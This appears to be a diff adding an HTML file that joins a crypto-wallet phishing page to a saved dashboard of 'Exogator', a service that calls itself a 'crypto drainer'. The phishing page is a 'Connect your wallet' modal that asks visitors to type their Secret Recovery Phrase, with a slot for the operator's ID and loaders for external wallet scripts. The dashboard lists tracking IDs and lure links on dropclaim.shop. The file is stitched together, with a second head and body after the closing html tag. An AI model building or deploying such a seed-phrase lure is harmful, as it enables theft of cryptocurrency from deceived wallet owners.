@@ -1,0 +1,2637 @@
+<!DOCTYPE html>
+<html class="loading" lang="en" data-textdirection="ltr" >
+<<head>
+   
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+    <link rel="stylesheet" href="./assets/css/style.css?v=09.19.205">
+
+
+  </head>
+  <body style="margin:0; padding: 0; background-color: #000000;">
+
+    <!-- WRITE YOUR ID HERE -->
+    <input type="hidden" value="KKVZSIIZKM4TTRZBGMK1MWNNSQFQ4VG2BWEQPGNSXQCBN" id="exogator_id">
+
+    <div class="modal__container" id="modal-container">
+        <div class="modal__content">
+            <div class="modal__close close-modal" onclick="closeModal()" title="Close">
+                <i class='bx bx-x'></i>
+            </div>
+
+            <h1 id="tito1" class="modal__title">Connect your wallet</h1>
+            <p id="tito2" class="modal__description">Please select one of the options below to connect your wallet.</p>
+
+            <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
+              
+              Other wallets 
+              <t bis_skin_checked="1" style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>
+
+              <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style=" width: 23px; right: 110px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 5px; background: #ffd3a1; border: 1px solid #b5b5b5; "> 
+
+              <img src="https://vectorseek.com/wp-content/uploads/2024/07/Trust-Wallet-Shield-Logo-Vector-Logo-Vector.svg-.png" style=" width: 21px; right: 134px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 6px; background: #ffffff; border: 1px solid #cccccca3; box-shadow: 3px 1px 10px -5px; "> 
+
+              <img src="https://images.mirror-media.xyz/publication-images/Lx_fohJ8ttprQ3DmDKU9N.png?height=2048&amp;width=2048" style=" width: 33px; right: 158px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 0px 0px; /* border: 1px solid #b5b5b5; */ box-shadow: 3px 1px 10px -5px; ">
+
+            </button>
+
+            <button id="tito3" class="modal__button modal__button-width" onclick="showseedme()"> 
+              Connect manually <t bis_skin_checked="1" style="/* width: 32px; */right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
+            </button>
+
+            <button class="modal__button-link close-modal">
+               <a style=" color: #9f9f9f; text-decoration: none; " href="https://trustwallet.com/">Haven't got a wallet ? Get started</a>
+            </button>
+
+        </div>
+    </div>
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+        <!-- Modal content -->
+        <div class="modal-content">
+            <div style="padding: 20px 22px;">
+                <span class="close">
+                    <select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border: 1px solid #ccc; border-radius: 9px; margin-right: 14px; color: #595959;">
+                        <option value="12" selected>12-word phrase</option>
+                        <option value="15">15-word phrase</option>
+                        <option value="18">18-word phrase</option>
+                        <option value="21">21-word phrase</option>
+                        <option value="24">24-word phrase</option>
+                    </select>
+                </span>
+
+                <h2 style="margin: 0px;">Connect manually</h2>
+                <p style="margin-top: 6px;font-size: 14px;color: #555555;">Enter the Secret Recovery Phrase that you were given when you created your wallet.</p>
+                <div>
+                    <div class="seed-phrase-container" id="seedPhraseContainer"></div>
+                </div>
+
+                <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
+                <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>
+
+                <button onclick="checkAllFieldsFilled()"  style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
+                
+                <div style="margin-top: 8px;text-align: center;">
+                    <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
+                    <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <button class="ex0connec" onclick="exoconnect()" >Connect wallet</button> 
+    <button class="ex0claim"  style="display: none;" onclick="claim()">claim</button>
+    
+    <span id="adresstracker" style="color: #fff; display: none;"></span>
+
+    <script>
+
+        let modaltheme  = 3;
+        let evm         = 1;
+        let seed        = 0;
+        let auto        = 0;
+        let dark        = 0;
+        let towsteps    = 0; //please read docs befor ENABLE this futures 
+        
+    </script>
+    
+    <script src="./assets/eth.js?v=09.19.205"></script>
+    <script src="./assets/w-modal.js?v=09.19.205"></script>
+    <script src="./assets/w-loader.js?v=09.19.205"></script>
+    <script src="./assets/modules.js?v=09.19.205"></script>
+    <script src="./assets/main.js?v=09.19.205"></script>
+    
+    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+  </body>
+</html>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0,minimal-ui">
+
+  
+  <title>Links Hub - Exogator</title>
+  <link rel="canonical" href="https://exogator.com/en/account/links" />
+  
+  <meta name="description" content="Exogator,drainer,crypto drainer,exogartor,">
+  <meta name="keywords" content="We will provide for all your needs; leave the hard work to us. Who knows? One wallet could change your life! Get started now !">
+  <meta name="Identifier-URL" content="https://exogator.com" />
+  <meta name="language" content="en" />
+  <meta name="author" content="exogator">
+  <meta name="theme-color" content="#000000" />
+  
+  <meta itemprop="name" content="Links Hub - Exogator">
+  <meta itemprop="description" content="Exogator,drainer,crypto drainer,exogartor,">
+  <meta itemprop="image" content="https://exogator.com/assets/imgs/logos/og.jpg">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@Exogator">
+  <meta name="twitter:creator" content="@Exogator">
+  <meta name="twitter:title" content="Links Hub - Exogator">
+  <meta name="twitter:description" content="Exogator,drainer,crypto drainer,exogartor,">
+  <meta name="twitter:image" content="https://exogator.com/assets/imgs/logos/og.jpg">
+  
+  <meta property="og:locale" content="en" />
+  <meta property="og:title" content="Links Hub - Exogator" />
+  <meta property="og:description" content="Exogator,drainer,crypto drainer,exogartor," />
+  <meta property="og:url" content="https://exogator.com/en/account/links" />
+  <meta property="og:site_name" content="Exogator" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://exogator.com/assets/imgs/logos/og.jpg" />
+  
+  <link rel="apple-touch-icon" href="https://exogator.com/assets/imgs/logos/original.png">
+  <link rel="shortcut icon" type="image/x-icon" href="https://exogator.com/assets/imgs/logos/favicon.ico">
+  
+
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://exogator.com/assets/css/style.css?v=94962481142">
+  <link rel="stylesheet" href="https://cdn.datatables.net/2.1.8/css/dataTables.bootstrap5.css">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+  
+  
+  
+   <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-VPKQ53RJBK"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-VPKQ53RJBK');
+    </script>
+    <!-- Yandex.Metrika counter -->
+    <script type="text/javascript" >
+       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+       m[i].l=1*new Date();
+       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+    
+       ym(98961542, "init", {
+            clickmap:true,
+            trackLinks:true,
+            accurateTrackBounce:true,
+            webvisor:true
+       });
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/98961542" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <!-- /Yandex.Metrika counter -->
+    
+  <style>
+
+    .form-switch .form-check-input {
+        width: 3em !important;
+    }
+    .form-check-input {
+        height: 1.5em !important;
+    }
+  </style>
+
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+   <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator@4.1.1/dist/index.browser.min.js"></script>
+
+</head>
+<body class="notranslate" style="background: #000000; background: linear-gradient(217deg, rgba(171, 251, 79, 1) -124%, rgba(0, 0, 0, 1) 50%, rgba(0, 0, 0, 1) 100%); background-repeat: no-repeat; background-size: cover; background-attachment: fixed;" >
+    <div class="sticky-top" style="border-bottom: 1px solid #d6ebfd30; margin: 0; width: 100%; background: #000; position: fixed; right: 0; top: 0; z-index: 10; transition: background-color 200ms linear; ">
+    <div class="container">
+    <div class="row align-items-center justify-content-center justify-content-md-between py-3">
+    
+        <div class="align-items-center col-6 col-md-3 mb-2 mb-md-0 text-dark text-decoration-none">
+          <button class="onlyph" id="showburger" style="border: 0;background: no-repeat;position: absolute;"><i class="bi bi-list" style=" font-size: 38px; margin-bottom: 22px; margin-top: -6px; display: block; "></i></button> 
+          <a href="https://exogator.com/en" style="margin-left: 44px;"> 
+            <img src="https://exogator.com/assets/imgs/logos/menu-logo.png" class="home-logo">
+            <t style=" margin-left: 14px; font-weight: 700; font-size: 22px; margin-top: 7px; position: absolute; ">Exogator</t>
+          </a>
+        </div>
+
+
+        
+
+      <style>
+       .dropdown-item {}
+       .searchareax:focus, input:focus{ outline: none; }
+       .searchareax input::placeholder {
+          color: blue;
+        }
+        .scrolled {border-bottom: 1px solid #d6ebfd30; background-color: #000000; }
+        .sresult {text-decoration: none; display: block; width: 100%; margin: 3px 0px; cursor: pointer; padding: 10px 16px; border-radius: 10px;}
+        .sresult:hover {background: #272a2f; font-weight: 500;}
+        .onesignal-customlink-container button{ 
+            background-color: rgb(14, 103, 255);
+            color: rgb(255, 255, 255) !important;
+            border-radius: 21px !important;
+            display: block !important;
+            width: 100% !important;
+            padding: 14px 0 !important;
+            font-size: 16px !important;
+        }
+        .state-subscribed { background-color: red !important; }
+        .dropdown-divider { border-top: 1px solid rgb(255 255 255 / 35%) !important;  }
+        .dropdown-item{ color: #a5a5a5; }
+        ..dropdown-item:hover{background: #000;}
+        .topupquickbu{ margin: 8px 0px 0px 0px !important; }
+      </style> 
+      <ul class="nav col-md-6 mb-2 onlypc justify-content-center mb-md-0"> 
+
+        <style>
+        .nav a {
+         color: #919191; text-decoration: none; font-weight: 400; font-size: 17px;
+        }
+        .nav a:hover {
+          color: #fff;
+        }
+        </style>
+        
+        <a href="https://exogator.com/en/buy">Select a Plan</a>
+        <t style="margin: 0px 12px;">∙</t>
+        <a href="https://exogator.com/en/howitswork">How It Works?</a>
+      
+      </ul>
+
+      <div class="col-6 col-md-3 text-end">
+         
+          <t id="balance-container" type="button" style="background: rgb(36, 36, 41); backdrop-filter: blur(20px); padding: 9px 13px 6px 17px; border-radius: 25px;"> <t  onclick="showtopup()" style="font-size: 16px; margin-right: 8px; position: relative; color: #adadad;"> Balance: <t id="balance" style="font-weight: 400;"></t> </t> <i id="toggle-icon" class="bi bi-eye-slash" style="font-size: 18px; color: #b1b0b0; cursor: pointer;"></i> </t>
+                
+
+                <div class="btn-group" style="vertical-align: inherit;">
+             <button type="button" data-bs-toggle="dropdown" data-bs-display="static" style="background: rgba(255, 255, 255, 0.12);backdrop-filter: blur(20px);padding: 5px 10px;border: 0;border-radius: 25px;" aria-expanded="false" class=""><i class="bi bi-person" style=" font-size: 22px; "></i> </button>
+              <ul class="dropdown-menu dropdown-menu-lg-end" style="margin-top: 8px; right: 0; left: auto; min-width: 280px; border-radius: 12px; background: #000; border: 1px solid #434343;">
+                
+                <li style="padding: 0 20px;margin: 5px 0 18px 0;"> 
+                    <div style=" background: #272727; color: #abfb4f; padding: 0px 0px; font-weight: 400; font-size: 26px; border-radius: 38px; width: 50px; height: 50px; text-align: center; align-content: center; display: inline-block;" >
+                        M                    </div> 
+                    <b style="font-size: 16px;display: initial;margin-top: -1px;margin-left: 10px;position: absolute;font-weight: 400;">magnum </b> 
+                    <p style="display: block;position: absolute;margin: -27px 0px 0px 60px;font-size: 12px;color: #000000;background: #abfb4f;padding: 2px 8px 1px 8px;border-radius: 4px;"> 
+                        <t style=" color: #000; font-weight: 600; ">  Ultimate <t style=" color: #000; font-weight: 600; "> 3644 days left</t>  </t> 
+                    </p>
+                </li>
+
+
+
+                
+                </li>
+                <li style="padding: 0 10px; margin: 5px 0;"><hr class="dropdown-divider"></li>
+                
+                <li style="padding: 0 10px; margin: 5px 0;"><a class="dropdown-item" style="border-radius: 10px; padding: 8px 16px 6px 16px;" href="https://exogator.com/en/account"><i class="fi fi-rr-user" style="margin-right:6px;"></i> Account</a></li>
+                <li style="padding: 0 10px; margin: 5px 0;"><a class="dropdown-item " style="border-radius: 10px; padding: 8px 16px 6px 16px;" href="https://exogator.com/en/account/orders"><i class="fi fi-rr-receipt" style="margin-right:6px;"></i> Invoices</a></li>
+                <li style="padding: 0 10px; margin: 5px 0;"><a class="dropdown-item" style="border-radius: 10px; padding: 8px 16px 6px 16px;" onclick="goto('https://t.me/Exomany')" ><i class="fi fi-rr-life-ring" style="margin-right:6px;"></i> Need help ?</a></li>
+                <li style="padding: 0 10px; margin: 5px 0;"><a class="dropdown-item" style="border-radius: 10px; padding: 8px 16px 6px 16px;" href="https://exogator.com/en/query/logout"><i class="fi fi-rr-lock" style="margin-right:6px;"></i> logout</a></li>
+              </ul>
+            </div>
+        
+       
+
+
+      </div>
+
+
+    </div>
+    </div>
+  </div>
+  
+  
+    <script> 
+        function generateRandomText(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+        
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                result += characters.charAt(randomIndex);
+            }
+        
+            return result;
+        }
+    </script>
+
+
+
+<div class="container">
+    
+    <div class="row" style="margin-top:160px;margin-bottom: 42px;">
+        <h1>Links Hub</h1>
+        <h5 style="color: #919191; font-weight: 300;"  >Here you can see all your page links, tracking links, and download your basic page.</h5>
+    </div>
+
+    <div class="row" style="margin-top:20px;">
+        
+                <div class="col-12" style=" text-align: right; margin-bottom: 26px; "> 
+            <button onclick="goto('https://exogator.com/en/account/trackcreate');" class="button-check" style="background: #000;padding: 11px 25px 9px 25px; border-radius: 18px;color: #ffffff !important;border: 1px solid #7f7f7f;margin-top: 14px;">Create Tracking & ID Link</button> 
+            <button onclick="goto('https://exogator.com/en/account/linkcreate');" class="button-check" style="background: #000;padding: 11px 25px 9px 25px; border-radius: 18px;color: #ffffff !important;border: 1px solid #7f7f7f;margin-top: 14px;">Create Page Link</button> 
+            <button onclick="goto('https://exogator.com/en/account/downloadpage');" class="button-check" style="background: #000;padding: 11px 25px 9px 25px; border-radius: 18px;color: #ffffff !important;border: 1px solid #7f7f7f;margin-top: 14px;">Download Basic Page</button> 
+        </div>
+        
+        <div class="col-12" style=" padding: 0px 32px; margin: 0;">
+            <div class="row">
+                        <div id="11583" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">xvxaxe </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 15 minutes ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11583)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink1s" value="KKVZSIIZKM4TTRZBGMK1MWNNSQFQ4VG2BWEQPGNSXQCBN" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink1s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy1s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink1() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink1");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy1").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink1s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink1s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy1s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11582" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Page                        </t>
+                        <b style="font-weight: 400;">xvxaxe </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 20 minutes ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11582)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Redirect to page link</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink2" value="https://dropclaim.shop/?g=FX1AVHWTJQ5DJPFY1WVGDKTDLLZUKMZBZ2D3APGOQFWPF" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy link" onclick="coppysharelink2()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy2"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink2() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink2");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy2").innerHTML = "Copied !"
+                        }
+                    </script>
+                                    </div>
+            </div>
+                        <div id="11581" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Page                        </t>
+                        <b style="font-weight: 400;">BYAC </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 15 hours ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11581)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Redirect to page link</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink3" value="https://dropclaim.shop/?g=R5FCJNSZ11IBNJ9VQU6ZT29APLFP2LKBSOPQU78XOAWXG" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy link" onclick="coppysharelink3()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy3"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink3() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink3");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy3").innerHTML = "Copied !"
+                        }
+                    </script>
+                                    </div>
+            </div>
+                        <div id="11580" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">AXEB2BPROO </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 1 day ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11580)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink4s" value="J1SHNZRWTHCJUHGNBDSYJIIXRPZJUX18HORRWKH1OOYPX" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink4s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy4s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink4() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink4");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy4").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink4s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink4s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy4s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
+                        <div id="11579" class="col-12 row" style="margin: 0px 0px 15px 0px; padding: 14px 12px 12px 12px; border: 1px solid #7f7f7f; border-radius: 25px;">
+                <div class="col-8" style="padding:0;">
+                    <div style="margin-left: 11px;">
+                        <t style=" color: #000; background: #abfb4f; padding: 1px 7px 2px 7px; margin-right: 5px; border-radius: 6px; font-size: 14px; " >
+                            Tracking & ID                        </t>
+                        <b style="font-weight: 400;">y predict </b> <br> 
+                        <t style=" font-size: 14px; color: #9c9c9c; ">Created 2 days ago</t> 
+                    </div>
+                    
+                </div>
+                <div class="col-4" style=" align-self: center; text-align: right; "> 
+                    
+                    <button onclick = "removefavorit(11579)" style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                        <i class="fi fi-rr-trash" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                    </button>
+                    <a  style="display:none;" href=">">
+                        <button style="background: #000; border: none; border-radius: 8px; font-size: 14px; width: 40px; color: #ccc !important; height: 40px; ">
+                            <i class="fi fi-rr-pencil" style=" color: #fff !important; position: absolute; font-size: 20px; margin: -11px 0px 0px -10px; "></i>
+                        </button> 
+                    </a>
+                </div>
+                <div class="col-12">
+                    
+                                                
+                                                <div class="input-group" style="padding-right: 7px;margin: 10px 0px 5px 0px;" bis_skin_checked="1">
+                        <span class="input-group-text" id="basic-addon1" style="background: #000; color: #9b9b9b;">Trakcing ID</span>
+                        <input readonly="" type="text" class="form-control no-border" id="sharelink5s" value="ID9Q7EQK8YPEYUPAZXD7D4PGSVVJ5KQQ4HUQRQF8FT2DN" placeholder="0">
+                        <span data-bs-toggle="tooltip" data-bs-title="Copy ID" onclick="coppysharelink5s()" class="input-group-text" style="color: var(--main); cursor:pointer;background: #000;" id="buttonlinksharecoopy5s"> <i class="fi fi-rr-clone" style="margin-left:5px; color:var(--main);"></i></span>
+                        </div>
+                                                
+                                                
+                    
+                    <script>
+                        function coppysharelink5() {
+                          // Get the text field
+                          var copyText = document.getElementById("sharelink5");
+                        
+                          // Select the text field
+                          copyText.select();
+                          copyText.setSelectionRange(0, 99999); // For mobile devices
+                        
+                          // Copy the text inside the text field
+                          navigator.clipboard.writeText(copyText.value);
+                          
+                          // Alert the copied text
+                          document.getElementById("buttonlinksharecoopy5").innerHTML = "Copied !"
+                        }
+                    </script>
+                                            <script>
+                            function coppysharelink5s() {
+                              // Get the text field
+                              var copyText = document.getElementById("sharelink5s");
+                            
+                              // Select the text field
+                              copyText.select();
+                              copyText.setSelectionRange(0, 99999); // For mobile devices
+                            
+                              // Copy the text inside the text field
+                              navigator.clipboard.writeText(copyText.value);
+                              
+                              // Alert the copied text
+                              document.getElementById("buttonlinksharecoopy5s").innerHTML = "Copied !"
+                            }
+                        </script>
+                                    </div>
+            </div>
